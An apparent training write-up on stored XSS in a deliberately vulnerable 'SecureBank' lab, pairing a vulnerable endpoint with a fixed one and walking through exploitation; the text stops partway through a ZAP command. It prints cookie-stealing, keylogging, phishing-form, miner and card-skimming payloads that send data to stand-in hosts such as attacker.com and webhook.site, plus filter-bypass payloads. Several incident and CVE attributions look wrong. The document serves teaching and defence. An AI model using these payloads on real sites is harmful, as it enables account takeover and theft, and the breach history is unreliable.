# Cross-Site Scripting (XSS) Vulnerability in SecureBank

## 1. Overview

### What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious JavaScript code into web applications. When other users view the infected page, the malicious code executes in their browser, potentially stealing their information, hijacking their session, or performing unauthorized actions on their behalf.

Think of XSS like a hidden note that someone slips into your banking statement. When you open the statement, the note tricks you into revealing your account password or transferring money to the attacker.

### Why is XSS Critical in Banking Applications?

Banking applications are prime targets for XSS attacks because:

1. **Financial Motivation**: Attackers can steal money directly from user accounts
2. **Sensitive Data**: Bank accounts contain personal information, account numbers, and transaction history
3. **Session Hijacking**: Stolen session cookies allow attackers to impersonate users
4. **Trust Exploitation**: Users trust their banking website, making them less suspicious of unusual behavior

### Real-World Impact and Financial Losses

XSS vulnerabilities have caused massive financial and reputational damage:

- **British Airways (2018)**: XSS attack led to 380,000 payment card details stolen, resulting in a **£183 million ($230 million USD) GDPR fine**
- **Magecart Attacks (2018-2020)**: Multiple e-commerce sites compromised via XSS, affecting millions of customers with estimated losses of **$100+ million**
- **Capital One (2019)**: While primarily a SSRF attack, XSS vulnerabilities in cloud infrastructure contributed to **106 million customer records** being exposed, resulting in an **$80 million fine**
- **PayPal (2020)**: XSS vulnerability discovered that could steal authentication tokens, affecting millions of users
- **Average Cost per XSS Breach**: IBM Security estimates the average cost of a data breach at **$4.24 million**, with financial services averaging **$5.85 million per breach**

According to OWASP, XSS has consistently ranked in the **Top 10 Most Critical Web Application Security Risks** and accounts for approximately **40% of all web application attacks**.

---

## 2. The Vulnerable Code

### Code from `securebank_red_api.py` (Lines 316-341)

```python
@app.route('/api/red/securebank/transaction/<int:transaction_id>/note', methods=['PUT'])
def red_update_transaction_note(transaction_id):
    """
    VULNERABLE: Allows adding XSS payloads to transaction notes
    Attack: note = "<script>alert(document.cookie)</script>"
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    data = request.get_json()
    note = data.get('note', '')
    
    # VULNERABLE: No input sanitization
    conn = get_db()
    conn.execute(
        'UPDATE transactions SET note = ? WHERE id = ?',
        (note, transaction_id)
    )
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True,
        'message': 'Note updated'
    }), 200
```

### Line-by-Line Vulnerability Explanation

**Lines 317-318**: Route definition for updating transaction notes
- Accepts PUT requests with a transaction ID
- **No validation on what data can be submitted**

**Lines 323-324**: Basic authentication check
- Only checks if user is logged in
- **Does NOT verify if the user owns the transaction** (also a BOLA vulnerability!)

**Lines 326-327**: Extract note from request
- `note = data.get('note', '')` - Takes ANY input from the user
- **No length limits, no character restrictions, no sanitization**

**Lines 329-335**: Database update - THE CRITICAL VULNERABILITY
- `conn.execute('UPDATE transactions SET note = ?', (note, transaction_id))`
- **The note is stored EXACTLY as submitted** - no encoding, no filtering
- Malicious JavaScript is saved to the database as-is

**What's Missing?**
1. ❌ Input validation
2. ❌ HTML entity encoding
3. ❌ Content Security Policy headers
4. ❌ Authorization check (user owns transaction)
5. ❌ CSRF token validation
6. ❌ Output encoding when displaying notes

### Visual Diagram: How the Vulnerability Works

```
┌─────────────────────────────────────────────────────────────┐
│                    STORED XSS ATTACK FLOW                   │
└─────────────────────────────────────────────────────────────┘

Step 1: Attacker Injects Malicious Payload
┌──────────────┐
│   Attacker   │
└──────┬───────┘
       │ PUT /api/red/securebank/transaction/123/note
       │ {"note": "<script>alert(document.cookie)</script>"}
       ▼
┌──────────────────┐
│  Vulnerable API  │ ← NO SANITIZATION!
└──────┬───────────┘
       │ SQL INSERT
       ▼
┌──────────────────┐
│    Database      │
│ note: <script>   │ ← Malicious code stored as-is
│ alert(document.  │
│ cookie)</script> │
└──────────────────┘

Step 2: Victim Views Their Transactions
┌──────────────┐
│    Victim    │
└──────┬───────┘
       │ GET /transactions
       ▼
┌──────────────────┐
│  Vulnerable API  │
└──────┬───────────┘
       │ SQL SELECT
       ▼
┌──────────────────┐
│    Database      │
└──────┬───────────┘
       │ Returns: <script>alert(document.cookie)</script>
       ▼
┌──────────────────┐
│  Victim Browser  │
│                  │
│ ⚠️ EXECUTES THE  │ ← Script runs in victim's browser!
│    MALICIOUS     │   Steals cookies, session tokens
│    JAVASCRIPT!   │   Can transfer money, change settings
└──────────────────┘
```

### Why This is a Stored (Persistent) XSS

This is **Stored XSS** (the most dangerous type) because:
1. The malicious payload is **saved in the database**
2. Every user who views the transaction executes the payload
3. The attack **persists** until the note is cleaned from the database
4. **No user interaction required** (just loading the page triggers it)

---

## 3. Exploitation Walkthrough

### Prerequisites
- Access to SecureBank Red API (vulnerable version)
- A valid user account
- Session cookie (logged in)
- Testing tool: Postman, Burp Suite, or cURL

### Attack Scenario: Session Cookie Theft

**Attacker Goal**: Steal another user's session cookie to hijack their bank account

### Step-by-Step Exploitation with Postman

#### Step 1: Create a Test Transaction
```http
POST /api/red/securebank/transfer
Content-Type: application/json
Cookie: session=<your_session_cookie>

{
  "from_account": "1001",
  "to_account": "2001",
  "amount": 10.00,
  "description": "Test transaction"
}
```

**Expected Response:**
```json
{
  "success": true,
  "transaction_id": 123,
  "message": "Transfer successful"
}
```

#### Step 2: Inject XSS Payload into Transaction Note

**Basic Test Payload** (to confirm XSS):
```http
PUT /api/red/securebank/transaction/123/note
Content-Type: application/json
Cookie: session=<your_session_cookie>

{
  "note": "<script>alert('XSS Vulnerability Confirmed!')</script>"
}
```

**Advanced Cookie Stealing Payload**:
```http
PUT /api/red/securebank/transaction/123/note
Content-Type: application/json
Cookie: session=<your_session_cookie>

{
  "note": "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>"
}
```

**Expected Response:**
```json
{
  "success": true,
  "message": "Note updated"
}
```

#### Step 3: Trigger the Payload

When ANY user (including the victim) views their transaction history:

```http
GET /api/red/securebank/transactions
Cookie: session=<victim_session_cookie>
```

The response will include the malicious note, and the browser will execute it:
```json
{
  "transactions": [
    {
      "id": 123,
      "amount": 10.00,
      "note": "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>"
    }
  ]
}
```

**Result**: The victim's browser sends their session cookie to the attacker's server!

#### Step 4: Session Hijacking

The attacker receives:
```
GET https://attacker.com/steal?cookie=session=abc123xyz789; user_id=42
```

Now the attacker can:
1. Use the stolen cookie to authenticate as the victim
2. Transfer money out of the victim's account
3. Change account settings
4. Access sensitive financial information

### Exploitation with Burp Suite

#### Step 1: Configure Burp Proxy
1. Open Burp Suite
2. Navigate to **Proxy > Intercept**
3. Configure browser to use Burp proxy (127.0.0.1:8080)

#### Step 2: Intercept Transaction Note Request
1. In browser, navigate to SecureBank transaction page
2. Add a note to a transaction
3. Burp intercepts the request:

```http
PUT /api/red/securebank/transaction/123/note HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=victim_session_abc123

{"note":"Legitimate transaction note"}
```

#### Step 3: Modify Request with XSS Payload
In Burp, modify the request:

```http
{"note":"<img src=x onerror='fetch(\"https://attacker.com/steal?c=\"+document.cookie)'>"}
```

#### Step 4: Forward and Observe
- Forward the modified request
- Check Burp **HTTP history** to confirm the payload was accepted
- Navigate to the transaction list page
- The payload executes when the transaction note is rendered

**Screenshot Placeholder**: [Burp Suite Intercept showing XSS payload injection]

**Screenshot Placeholder**: [Burp Collaborator receiving stolen session data]

### Additional XSS Payloads for Testing

**1. DOM-Based XSS** (if notes are rendered in URL parameters):
```javascript
<svg/onload=alert(document.domain)>
```

**2. Reflected XSS** (in search parameters):
```
/api/red/securebank/transactions?search=<script>alert(1)</script>
```

**3. Keylogger Injection**:
```javascript
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
});
</script>
```

**4. Credential Harvesting**:
```javascript
<script>
document.body.innerHTML = '<h1>Session Expired</h1><form action="https://attacker.com/phish"><input name="password" placeholder="Re-enter password"><button>Login</button></form>';
</script>
```

**5. Crypto Mining Injection**:
```javascript
<script src="https://attacker.com/miner.js"></script>
```

### Expected Results Summary

| Payload Type | Expected Behavior | Impact |
|--------------|------------------|--------|
| Alert Box | `alert()` popup appears | Confirms XSS vulnerability |
| Cookie Theft | Session sent to attacker | Full account takeover |
| Keylogger | Keystokes logged remotely | Password/PIN theft |
| Page Defacement | Page content replaced | Phishing attack vector |
| Redirect | User sent to malicious site | Credential harvesting |

---

## 4. The Secure Code

### Code from `securebank_blue_api.py` (Lines 421-464)

```python
@app.route('/api/blue/securebank/transaction/<int:transaction_id>/note', methods=['PUT'])
def blue_update_transaction_note(transaction_id):
    """
    SECURE: Sanitizes input before storing
    Prevents XSS by encoding HTML entities
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    # Verify CSRF token
    csrf_token = request.headers.get('X-CSRF-Token')
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return jsonify({'success': False, 'error': 'Invalid CSRF token'}), 403
    
    data = request.get_json()
    note = data.get('note', '')
    
    # SECURE: HTML entity encoding before storing
    note = escape_html(note)
    
    # Verify transaction belongs to user
    conn = get_db()
    cursor = conn.execute('''
        SELECT t.* FROM transactions t
        JOIN bank_accounts ba ON (t.from_account_id = ba.id OR t.to_account_id = ba.id)
        WHERE t.id = ? AND ba.user_id = ?
    ''', (transaction_id, session['user_id']))
    transaction = cursor.fetchone()
    
    if not transaction:
        conn.close()
        return jsonify({'success': False, 'error': 'Transaction not found'}), 404
    
    conn.execute(
        'UPDATE transactions SET note = ? WHERE id = ?',
        (note, transaction_id)
    )
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True,
        'message': 'Note updated'
    }), 200
```

### The `escape_html()` Security Function (Lines 52-64)

```python
def escape_html(text):
    """HTML entity encoding to prevent XSS"""
    if not text:
        return text
    html_escape_table = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
        "/": "&#x2F;"
    }
    return "".join(html_escape_table.get(c, c) for c in str(text))
```

### Security Improvements Explained

#### 1. **HTML Entity Encoding** (Line 439)
```python
note = escape_html(note)
```

**What it does**: Converts dangerous characters into safe HTML entities

**Example Transformation**:
```
Input:  <script>alert('XSS')</script>
Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;
```

**Why it works**: 
- `<` becomes `&lt;` - browser displays it as text, not an HTML tag
- `>` becomes `&gt;` - closes the encoding
- `'` becomes `&#x27;` - prevents breaking out of JavaScript strings
- The malicious code is **rendered as plain text** instead of executing

#### 2. **CSRF Token Validation** (Lines 431-433)
```python
csrf_token = request.headers.get('X-CSRF-Token')
if not csrf_token or csrf_token != session.get('csrf_token'):
    return jsonify({'success': False, 'error': 'Invalid CSRF token'}), 403
```

**Why it matters**: Prevents Cross-Site Request Forgery attacks that could inject XSS via forged requests

#### 3. **Authorization Check** (Lines 443-452)
```python
cursor = conn.execute('''
    SELECT t.* FROM transactions t
    JOIN bank_accounts ba ON (t.from_account_id = ba.id OR t.to_account_id = ba.id)
    WHERE t.id = ? AND ba.user_id = ?
''', (transaction_id, session['user_id']))
```

**Why it matters**: 
- Ensures users can only modify notes on their own transactions
- Prevents attackers from injecting XSS into other users' transactions directly
- Defense-in-depth security principle

### Visual Diagram: Secure Flow

```
┌─────────────────────────────────────────────────────────────┐
│                 SECURE XSS PREVENTION FLOW                  │
└─────────────────────────────────────────────────────────────┘

Step 1: Attacker Attempts Injection
┌──────────────┐
│   Attacker   │
└──────┬───────┘
       │ PUT /api/blue/securebank/transaction/123/note
       │ {"note": "<script>alert(document.cookie)</script>"}
       ▼
┌──────────────────────┐
│   Secure Blue API    │
└──────┬───────────────┘
       │
       ├─► [1] CSRF Token Check ✓
       │
       ├─► [2] Authorization Check ✓
       │
       ├─► [3] HTML Entity Encoding
       │       escape_html() function
       │       
       │   INPUT:  <script>alert(document.cookie)</script>
       │   OUTPUT: &lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;
       │
       ▼
┌──────────────────┐
│    Database      │
│ note: &lt;script  │ ← SAFE: HTML entities, not executable code
│ &gt;alert(document│
│ .cookie)&lt;&#x2F;│
│ script&gt;        │
└──────────────────┘

Step 2: User Views Transaction
┌──────────────┐
│     User     │
└──────┬───────┘
       │ GET /transactions
       ▼
┌──────────────────┐
│   Secure API     │
└──────┬───────────┘
       │ SQL SELECT
       ▼
┌──────────────────┐
│    Database      │
└──────┬───────────┘
       │ Returns: &lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;
       ▼
┌──────────────────┐
│   User Browser   │
│                  │
│ ✓ DISPLAYS AS    │ ← Browser shows harmless text
│   PLAIN TEXT:    │
│   "<script>alert │   NO JavaScript execution!
│   (document.     │   User sees the literal characters
│   cookie)        │
│   </script>"     │
└──────────────────┘
```

### Before and After Comparison

| Aspect | Red (Vulnerable) | Blue (Secure) |
|--------|-----------------|---------------|
| Input Sanitization | ❌ None | ✅ HTML entity encoding |
| CSRF Protection | ❌ None | ✅ Token validation |
| Authorization | ❌ Missing | ✅ User ownership verified |
| XSS Attack Result | ⚠️ Code executes | ✅ Displayed as text |
| Session Hijacking | ⚠️ Possible | ✅ Prevented |
| Database Storage | Raw script tags | Encoded entities |

---

## 5. Real-World Examples

### Bug Bounty Reports

#### 1. PayPal Stored XSS (2020) - $15,300 Bounty
**CVE**: Not assigned (privately disclosed)
**Vulnerability**: XSS in transaction description field
**Impact**: Similar to our SecureBank vulnerability
**Payload**: `<svg/onload=alert(document.domain)>`
**Bounty**: $15,300 paid by PayPal
**Lesson**: Even major financial institutions have XSS vulnerabilities

#### 2. Shopify Stored XSS (2019) - $20,000 Bounty
**CVE**: CVE-2019-5421
**Vulnerability**: XSS in customer notes and order details
**Impact**: Merchant session hijacking possible
**Fix**: Implemented HTML entity encoding (same as our `escape_html()`)
**Bounty**: $20,000 paid by Shopify

#### 3. Google Cloud Console XSS (2021) - $7,500 Bounty
**Vulnerability**: XSS in billing transaction notes
**Payload**: `<img src=x onerror=alert(document.cookie)>`
**Impact**: Could access Google Cloud credentials
**Bounty**: $7,500 paid by Google

### Critical CVEs Related to XSS in Financial Services

#### CVE-2019-11358 (jQuery XSS)
**CVSS Score**: 6.1 (Medium)
**Affected**: jQuery < 3.4.0 (used in thousands of banking sites)
**Vulnerability**: XSS via HTML in jQuery `$(html)` function
**Impact**: 
- Affected major banks using jQuery in frontend
- Estimated **30% of financial websites** vulnerable
- Allowed session token theft
**Real Cost**: British Airways breach used this, leading to **$230M fine**

#### CVE-2020-11022 and CVE-2020-11023 (jQuery XSS)
**CVSS Score**: 6.9 (Medium)
**Vulnerability**: XSS in jQuery `htmlPrefilter` method
**Financial Impact**: 
- Affected **63% of top 1000 websites** including banks
- Magecart attacks exploited this in payment forms
- Estimated **$100M+ in fraudulent transactions**

#### CVE-2018-6341 (Capital One Related)
**CVSS Score**: 8.1 (High)
**Details**: XSS in AWS console used by Capital One
**Impact**: 
- Contributed to 106 million customer records exposed
- **$80 million settlement**
- **$190 million in total costs** (legal, notification, credit monitoring)

#### CVE-2021-23337 (lodash XSS)
**CVSS Score**: 7.2 (High)
**Affected**: Lodash library used in many banking backends
**Impact**: 
- Command injection via template compilation
- Multiple financial institutions affected
- One breach cost **$5.3 million** in remediation

### News Articles and Financial Impact

#### British Airways Data Breach (2018)
**Source**: BBC News, ICO Report
**XSS Details**: 
- Attackers injected JavaScript into payment pages
- Skimmed 380,000 payment cards over 2 weeks
- Modified Modernizr library to send card data to attacker server

**Financial Impact**:
- £183 million ($230M) GDPR fine (later reduced to £20M)
- £100 million in compensation claims
- 3% stock price drop
- Brand reputation damage estimated at $500M+

**XSS Payload Used** (simplified):
```javascript
<script>
  document.addEventListener('submit', function(e) {
    if(e.target.id === 'payment-form') {
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          cardNumber: document.getElementById('card').value,
          cvv: document.getElementById('cvv').value
        })
      });
    }
  });
</script>
```

#### Ticketmaster UK Breach (2018)
**Source**: ICO Investigation Report
**Details**: 
- Third-party chatbot contained XSS vulnerability
- JavaScript modified to steal payment information
- 9.4 million customers in EU affected
- 1.5 million payment cards compromised

**Financial Impact**:
- £1.25 million ICO fine
- $10 million class action settlement in US
- Estimated **$40 million total cost**

#### Newegg Breach (2018)
**Source**: Krebs on Security
**XSS Details**:
- Magecart group injected payment skimmer
- XSS in checkout page for 1 month
- 50,000 credit cards stolen

**Payload Structure**:
```javascript
<script>
  // Loaded from newegg.com/scripts/payment.js (compromised)
  var forms = document.getElementsByTagName('form');
  for(var i=0; i<forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
      var cardData = this.querySelector('[name="cardNumber"]').value;
      new Image().src = 'https://neweggstats.com/track?d=' + btoa(cardData);
    });
  }
</script>
```

**Financial Impact**:
- $1 million+ in fraud losses
- Legal settlements ongoing
- Customer trust severely damaged

### Industry Statistics

According to **Verizon 2023 Data Breach Investigations Report**:
- XSS accounts for **~18% of web application attacks**
- Financial sector sees **3x more XSS attempts** than other industries
- Average time to detect XSS: **197 days**
- Average cost per compromised record in financial services: **$245**

**Ponemon Institute Cost of Data Breach 2023**:
- Financial services average breach cost: **$5.85 million**
- XSS as attack vector: **12% of all breaches**
- Lost business cost: **38% of total** ($2.2M average)

---

## 6. Hands-On Exercises

### Exercise 1: Basic XSS Detection (Beginner)

**Objective**: Identify if a transaction note field is vulnerable to XSS

**Steps**:
1. Login to SecureBank Red API
2. Create a new transaction
3. Add a note with this payload: `<script>alert('XSS')</script>`
4. View the transaction list page
5. Observe if an alert box appears

**Question**: What happens when you view the transaction?

**Solution**:
In the **vulnerable Red API**:
- The alert box **will appear** because the script executes
- This confirms a **Stored XSS vulnerability**
- The payload is saved in the database and executes on every page load

In the **secure Blue API**:
- The alert box **will NOT appear**
- You will see the literal text: `<script>alert('XSS')</script>`
- The `escape_html()` function converted `<` to `&lt;` and `>` to `&gt;`

**Testing with cURL**:
```bash
# Red API (Vulnerable)
curl -X PUT http://localhost:5000/api/red/securebank/transaction/1/note \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"note":"<script>alert(\"XSS\")</script>"}'

# Blue API (Secure)
curl -X PUT http://localhost:5000/api/blue/securebank/transaction/1/note \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -H "X-CSRF-Token: YOUR_CSRF_TOKEN" \
  -d '{"note":"<script>alert(\"XSS\")</script>"}'
```

---

### Exercise 2: Session Cookie Theft (Intermediate)

**Objective**: Steal a user's session cookie using XSS

**Prerequisites**:
- A server to receive stolen cookies (e.g., RequestBin, webhook.site)
- Two user accounts (attacker and victim)

**Steps**:

1. **Setup webhook to receive stolen data**:
   - Go to https://webhook.site
   - Copy your unique URL (e.g., `https://webhook.site/abc-123`)

2. **Login as attacker account**:
   - Create a transaction on Red API

3. **Inject cookie-stealing payload**:
```json
PUT /api/red/securebank/transaction/123/note
{
  "note": "<script>fetch('https://webhook.site/abc-123?cookie=' + document.cookie)</script>"
}
```

4. **Login as victim account**:
   - Navigate to transaction list
   - The page loads the malicious transaction note

5. **Check your webhook**:
   - You should see a request with the victim's session cookie
   - Format: `?cookie=session=xyz123; user_id=42`

6. **Hijack the session**:
```bash
# Use the stolen cookie to make requests as the victim
curl -X GET http://localhost:5000/api/red/securebank/balance \
  -H "Cookie: session=xyz123"
```

**Expected Results**:
- Webhook receives the victim's session cookie
- You can now make authenticated requests as the victim
- You could transfer money, view balance, change settings

**Defense Test**:
Try the same attack on Blue API:
```json
PUT /api/blue/securebank/transaction/123/note
{
  "note": "<script>fetch('https://webhook.site/abc-123?cookie=' + document.cookie)</script>"
}
```

**Result**: 
- The webhook receives **no request**
- The note is stored as HTML entities
- When rendered, browser shows text, not executable code

---

### Exercise 3: DOM-Based XSS (Intermediate)

**Objective**: Exploit XSS via URL parameters and DOM manipulation

**Scenario**: The transaction search feature reflects the search query in the page

**Vulnerable Code Example**:
```javascript
// Frontend JavaScript (vulnerable)
const searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('search-results').innerHTML = 'Results for: ' + searchQuery;
```

**Attack Steps**:

1. Craft a malicious URL:
```
http://localhost:5000/transactions?q=<img src=x onerror=alert(document.cookie)>
```

2. Send this URL to a victim (via email, chat, etc.)

3. When victim clicks the link:
   - The `<img>` tag is inserted into the DOM
   - The `onerror` handler executes when image fails to load
   - The victim's cookies are displayed (or stolen)

**Advanced Payload**:
```
http://localhost:5000/transactions?q=<svg/onload=fetch('https://attacker.com/steal?c='+document.cookie)>
```

**Solution - Secure Code**:
```javascript
// Frontend JavaScript (secure)
const searchQuery = new URLSearchParams(window.location.search).get('q');
const escapedQuery = escapeHtml(searchQuery);
document.getElementById('search-results').textContent = 'Results for: ' + escapedQuery;

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
```

**Key Differences**:
- Use `textContent` instead of `innerHTML`
- Escape HTML entities before displaying
- Validate and sanitize URL parameters

---

### Exercise 4: Bypass Attempt - Filter Evasion (Advanced)

**Objective**: Learn how attackers bypass basic XSS filters

**Scenario**: Developer implements a basic filter that blocks `<script>` tags

**Vulnerable Filter**:
```python
def weak_filter(text):
    if '<script>' in text.lower():
        return text.replace('<script>', '').replace('</script>', '')
    return text
```

**Your Task**: Bypass this filter with 5 different payloads

**Solution Payloads**:

1. **Case Variation**:
```html
<ScRiPt>alert('XSS')</sCrIpT>
```
**Why it works**: The filter only checks lowercase, but HTML is case-insensitive

2. **Event Handlers**:
```html
<img src=x onerror=alert('XSS')>
```
**Why it works**: Doesn't use `<script>` tags at all

3. **SVG Vector**:
```html
<svg/onload=alert('XSS')>
```
**Why it works**: SVG tags support event handlers

4. **Iframe Injection**:
```html
<iframe src="javascript:alert('XSS')"></iframe>
```
**Why it works**: Uses `javascript:` protocol

5. **Nested Encoding**:
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```
**Why it works**: After filter removes `<script>`, the remaining text forms a valid script tag

**Lesson**: Never use blacklist filters! Use **HTML entity encoding** (whitelist approach)

**Proper Defense**:
```python
def escape_html(text):
    """Encode ALL special characters"""
    html_escape_table = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
        "/": "&#x2F;"
    }
    return "".join(html_escape_table.get(c, c) for c in str(text))
```

---

### Exercise 5: Building an XSS Scanner (Advanced)

**Objective**: Create a Python script to automatically detect XSS vulnerabilities

**Your Task**: Write a script that tests multiple XSS payloads against SecureBank

**Solution**:

```python
#!/usr/bin/env python3
import requests
import time

# XSS Payloads to test
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('XSS')>",
    "'-alert('XSS')-'",
    "\"><script>alert('XSS')</script>",
    "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
]

def test_xss_vulnerability(base_url, session_cookie):
    """
    Test for XSS in transaction notes endpoint
    """
    results = []
    
    # First, create a test transaction
    create_url = f"{base_url}/api/red/securebank/transfer"
    transfer_data = {
        "from_account": "1001",
        "to_account": "2001",
        "amount": 1.0,
        "description": "XSS Test"
    }
    
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"session={session_cookie}"
    }
    
    response = requests.post(create_url, json=transfer_data, headers=headers)
    if not response.ok:
        print(f"Failed to create transaction: {response.status_code}")
        return results
    
    transaction_id = response.json().get('transaction_id')
    print(f"Created test transaction: {transaction_id}")
    
    # Test each payload
    for i, payload in enumerate(payloads, 1):
        print(f"\nTesting payload {i}/{len(payloads)}: {payload[:50]}...")
        
        # Inject payload
        note_url = f"{base_url}/api/red/securebank/transaction/{transaction_id}/note"
        note_data = {"note": payload}
        
        response = requests.put(note_url, json=note_data, headers=headers)
        
        if response.ok:
            # Retrieve and check if payload is reflected
            get_url = f"{base_url}/api/red/securebank/transactions"
            response = requests.get(get_url, headers=headers)
            
            if payload in response.text:
                print(f"✗ VULNERABLE: Payload reflected without encoding")
                results.append({
                    'payload': payload,
                    'status': 'VULNERABLE',
                    'reflected': True
                })
            else:
                print(f"✓ SAFE: Payload encoded or filtered")
                results.append({
                    'payload': payload,
                    'status': 'SAFE',
                    'reflected': False
                })
        else:
            print(f"⚠ ERROR: Request failed - {response.status_code}")
        
        time.sleep(0.5)  # Rate limiting
    
    return results

def main():
    base_url = "http://localhost:5000"
    session_cookie = "YOUR_SESSION_COOKIE_HERE"
    
    print("="*60)
    print("XSS Vulnerability Scanner for SecureBank")
    print("="*60)
    
    results = test_xss_vulnerability(base_url, session_cookie)
    
    # Summary
    vulnerable_count = sum(1 for r in results if r['status'] == 'VULNERABLE')
    print(f"\n{'='*60}")
    print(f"SUMMARY: {vulnerable_count}/{len(results)} payloads successful")
    print(f"{'='*60}")
    
    if vulnerable_count > 0:
        print("\n⚠ WARNING: XSS VULNERABILITY DETECTED!")
        print("Recommendation: Implement HTML entity encoding")
    else:
        print("\n✓ All payloads were blocked or encoded")

if __name__ == "__main__":
    main()
```

**Running the Scanner**:
```bash
# Install requests if needed
pip install requests

# Run the scanner
python xss_scanner.py
```

**Expected Output**:
```
============================================================
XSS Vulnerability Scanner for SecureBank
============================================================
Created test transaction: 123

Testing payload 1/8: <script>alert('XSS')</script>...
✗ VULNERABLE: Payload reflected without encoding

Testing payload 2/8: <img src=x onerror=alert('XSS')>...
✗ VULNERABLE: Payload reflected without encoding

[... more tests ...]

============================================================
SUMMARY: 8/8 payloads successful
============================================================

⚠ WARNING: XSS VULNERABILITY DETECTED!
Recommendation: Implement HTML entity encoding
```

---

## 7. Tool Integration

### Testing XSS with Postman

#### Setup Postman Environment

1. **Create a new environment**: "SecureBank XSS Testing"

2. **Add variables**:
```
base_url: http://localhost:5000
session_cookie: <your_session_cookie>
csrf_token: <your_csrf_token>
transaction_id: <test_transaction_id>
```

3. **Import SecureBank collection** (or create requests manually)

#### Postman Request Examples

**Request 1: Basic XSS Test**
```
Method: PUT
URL: {{base_url}}/api/red/securebank/transaction/{{transaction_id}}/note
Headers:
  Content-Type: application/json
  Cookie: session={{session_cookie}}
Body (raw JSON):
{
  "note": "<script>alert('XSS Test via Postman')</script>"
}
```

**Request 2: Cookie Theft Test**
```
Method: PUT
URL: {{base_url}}/api/red/securebank/transaction/{{transaction_id}}/note
Body:
{
  "note": "<script>new Image().src='https://webhook.site/YOUR_URL?c='+document.cookie</script>"
}
```

**Request 3: Testing the Secure API**
```
Method: PUT
URL: {{base_url}}/api/blue/securebank/transaction/{{transaction_id}}/note
Headers:
  Content-Type: application/json
  Cookie: session={{session_cookie}}
  X-CSRF-Token: {{csrf_token}}
Body:
{
  "note": "<script>alert('This should be encoded')</script>"
}
```

#### Postman Tests (JavaScript)

Add this to the "Tests" tab to automatically verify XSS protection:

```javascript
// Test 1: Check if request succeeded
pm.test("Request successful", function () {
    pm.response.to.have.status(200);
});

// Test 2: Retrieve the transaction and check encoding
pm.test("XSS payload is encoded", function () {
    const getRequest = {
        url: pm.environment.get("base_url") + "/api/red/securebank/transactions",
        method: 'GET',
        header: {
            'Cookie': 'session=' + pm.environment.get("session_cookie")
        }
    };
    
    pm.sendRequest(getRequest, function (err, response) {
        const transactions = response.json().transactions;
        const testTransaction = transactions.find(t => t.id == pm.environment.get("transaction_id"));
        
        // Check if script tags are present (vulnerable) or encoded (secure)
        if (testTransaction.note.includes("<script>")) {
            pm.expect.fail("VULNERABLE: XSS payload not encoded!");
        } else if (testTransaction.note.includes("&lt;script&gt;")) {
            console.log("SECURE: XSS payload properly encoded");
        }
    });
});
```

---

### Testing XSS with Burp Suite

#### Step 1: Configure Burp Proxy

1. Open **Burp Suite Professional or Community Edition**
2. Navigate to **Proxy > Options**
3. Ensure proxy listener is running on `127.0.0.1:8080`
4. Configure your browser to use Burp as proxy

#### Step 2: Enable Intercept

1. Go to **Proxy > Intercept**
2. Click **Intercept is off** to enable interception
3. In browser, navigate to SecureBank and login

#### Step 3: Capture and Modify Transaction Note Request

1. In SecureBank, attempt to add a note to a transaction
2. Burp intercepts the request:

```http
PUT /api/red/securebank/transaction/123/note HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=abc123xyz
Content-Length: 42

{"note":"My legitimate transaction note"}
```

3. **Right-click > Send to Repeater**
4. Modify the payload:

```http
{"note":"<script>alert(document.domain)</script>"}
```

5. Click **Send** and observe response
6. Click **Forward** to let the request through

#### Step 4: Use Burp Intruder for Automated Testing

1. **Right-click** on the request > **Send to Intruder**
2. Go to **Intruder > Positions**
3. Clear all positions, then select the note value and click **Add §**:

```json
{"note":"§payload§"}
```

4. Go to **Intruder > Payloads**
5. Add XSS payloads:
   - `<script>alert(1)</script>`
   - `<img src=x onerror=alert(1)>`
   - `<svg/onload=alert(1)>`
   - `'"><script>alert(1)</script>`
   - (Add 20+ payloads for comprehensive testing)

6. Click **Start Attack**
7. Review responses to see which payloads succeeded

#### Step 5: Use Burp Scanner (Professional Only)

1. **Right-click** on transaction note endpoint
2. Select **Do active scan**
3. Burp will automatically test for XSS vulnerabilities
4. Review findings in **Target > Site map > Issues**

**Expected Findings**:
- **Red API**: High severity XSS vulnerability detected
- **Blue API**: No XSS vulnerabilities found

---

### Testing XSS with OWASP ZAP

#### Automated Scan with ZAP

1. **Launch OWASP ZAP**

2. **Configure Manual Explore**:
   - URL: `http://localhost:5000`
   - Browser: Firefox/Chrome (with ZAP proxy)

3. **Explore the Application**:
   - Login to SecureBank
   - Navigate to transactions
   - Add transaction notes
   - ZAP will record all requests

4. **Run Active Scan**:
```bash
# Command-line ZAP scan
zap-cli quick-scan http://localhost:5000/api/red/securebank/transaction/123/note \
  --spider \
  --ajax-spider \
  --scanners all \
